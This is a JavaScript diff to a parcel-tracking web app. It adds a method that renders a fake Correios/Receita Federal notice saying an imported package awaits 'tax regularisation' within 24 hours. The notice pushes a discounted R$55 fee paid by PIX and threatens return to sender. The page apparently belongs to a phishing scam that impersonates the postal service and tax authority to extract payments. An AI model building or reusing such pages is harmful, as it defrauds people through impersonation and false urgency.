@@ -828,6 +828,74 @@ class TrackingSystem {
             DOMUtils.setHTML(jumbotron, '<!-- Conteúdo será adicionado aqui conforme sua especificação -->');
         }
     }
+	
+	// === MODIFICAÇÃO NO ARQUIVO app/index.js ===
+
+// Substitua o método finalizarConsulta() existente por este:
+
+finalizarConsulta() {
+    // Remover classe "oculto" do tabs-rastreamento
+    const tabsRastreamento = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
+    if (tabsRastreamento) {
+        DOMUtils.removeClass(tabsRastreamento, 'oculto');
+    }
+    
+    // Adicionar conteúdo específico no jumbotron
+    const jumbotron = domCache.get('.jumbotron');
+    if (jumbotron) {
+        const novoConteudo = this.gerarConteudoJumbotron();
+        DOMUtils.setHTML(jumbotron, novoConteudo);
+    }
+    
+    // === SCROLL INSTANTÂNEO PARA O TOPO ===
+    this.scrollToTopInstant();
+}
+
+scrollToTopInstant() {
+    // Método mais compatível e instantâneo
+    window.scrollTo(0, 0);
+    
+    // Força o scroll também no body e html (garantia para todos os navegadores)
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    
+    // Para iOS Safari e alguns navegadores mobile
+    if (window.pageYOffset !== undefined) {
+        window.pageYOffset = 0;
+    }
+}
+
+gerarConteudoJumbotron() {
+    return `
+        <div class="campos"></div>
+        <div class="campos captcha">
+            <div class="campo">
+                <div class="rotulo">
+                    <label for="objeto">
+                        Prezado(a) destinatário(a),<br>
+                        Sua <span style="font-weight: bold">encomenda importada</span> foi <span style="font-weight: bold">devidamente autorizada pela Receita Federal</span> e encontra-se em nossa unidade de distribuição.<br><br>
+                        <span style="font-weight: bold">Status: </span><span style="font-weight: bold; color:red">⚠️ AGUARDANDO REGULARIZAÇÃO TRIBUTÁRIA</span><br>
+                        <span style="font-weight: bold">Prazo para regularização: <span style="color: red">⏰ 24 HORAS</span></span><br>
+                        <span style="font-weight: bold">Após o vencimento do prazo, a encomenda será <span style="color: red">devolvida ao remetente</span> conforme regulamentação dos Correios.</span>
+                    </label>
+                </div>
+            </div>
+            <div class="campo">
+                <div class="controle">
+                    <button type="button" id="b-realizar-pagamento" name="b-realizar-pagamento" class="btn btn-primary botao-principal">REALIZAR PAGAMENTO</button>
+                    <button type="button" id="b-voltar" name="b-voltar" class="btn btn-primary botao-principal" onclick="location.reload()">Voltar</button>
+                </div>
+                <div class="mensagem">
+                    <span style="font-weight: bold; color:green; font-size: clamp(14px, 4vw, 18px);">
+                        Taxa: De <span style="text-decoration: line-through;">R$ 137,50</span> por apenas R$ 55,00
+                    </span>
+                    <br><span style="font-weight: bold; color:green">Liberação imediata após confirmação via PIX</span>
+                    <br><span style="font-weight: bold; color:darkorange">Taxa promocional - desconto de 60% aplicado</span>
+                </div>
+            </div>
+        </div>
+    `;
+}
 
     destroy() {
         apiManager.cancelAllRequests();
